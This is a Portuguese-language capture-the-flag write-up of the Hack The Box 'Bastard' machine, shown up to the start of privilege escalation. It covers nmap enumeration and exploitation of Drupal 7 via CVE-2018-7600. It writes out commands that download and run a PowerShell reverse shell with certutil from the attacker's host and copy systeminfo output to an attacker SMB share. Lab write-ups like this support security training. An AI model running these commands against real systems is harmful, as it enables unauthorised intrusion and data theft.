---
title:     "Hack The Box - Bastard"
tags: [windows,medium]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/1.jpg)

## Enumeration

Inicialmente, utilizamos o nmap para obter informacoes por exemplo: version, ports, status, vulns...

```
root@kali:~/HTB-Windows/bastard# nmap -Pn -p- -oN nmap/allports_tcp 10.10.10.9
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 21:06 EDT
Nmap scan report for 10.10.10.9
Host is up (0.20s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 430.79 seconds
```

Um novo scan apenas com as portas encontradas e assim obter versionamento.

```
oot@kali:~/HTB-Windows/bastard# nmap -sV -p80,135 -oN nmap/version 10.10.10.9
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 23:14 EDT
Nmap scan report for 10.10.10.9
Host is up (0.19s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 7.5
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.51 seconds
```

Navegando ate o servido HTTP na porta 80, indentificco um DRUPAL

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/2.jpg)

Huuuuuum... Veriricando o source do site eu vejo que trata-se de um **DRUPAL 7** e de acordo com minha experiencia existe exploits pra versao.

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/3.jpg)

## Find exploits

Uma busca rapida encontramos varias formas de explorar

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/4.jpg)


## Exploitation

Encontrei um exploit interessante e precisamos testar **CVE-2018-7600**

***reference*** https://github.com/pimps/CVE-2018-7600.git

Realmente eh vulneravel

`python drupa7-CVE-2018-7600.py -c whoami http://10.10.10.9/`

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/5.jpg)

## Reverse Shell

Estou um tempinho tentando transferir arquivos para maquina e assim obter uma reverse shell

Acabei de fazer um teste e ver se o alvo se comunicava de volta comigo e sim, esta tudo ok.. preciso continuar tentando encontrar uma maneira de transferir arquivos..

AHhh, lembrando que eu ja dei uma verificada rapidas nos arquivos encontrados no diretorio do drupal.

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/6.jpg)

Consegui usando o certutil

`python drupa7-CVE-2018-7600.py -c "certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1" http://10.10.10.9/`

`certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1`

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/7.jpg)

Enfim pegamos nossa reverse shell

`python drupa7-CVE-2018-7600.py -c "powershell.exe -exec bypass .\shell.ps1" http://10.10.10.9/`

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/8.jpg)

## Privilege Escalation

Vamos comecar a sessao de PE e assim ter acesso de user e system

![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/9.jpg)

Continuando a busca por vetores de escalada, comeco sempre por kernel exploitation, vamos user o **wesng** e o **windows-exploit-suggester**

Mas primeiro precisamos transferir o output do comando  **systeminfo** para nossa maquina.. usei o smbserver do impacket

`PS C:\inetpub\drupal-7.54> systeminfo >> \\10.10.14.36\tools\systeminfo.txt`

![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/10.jpg)



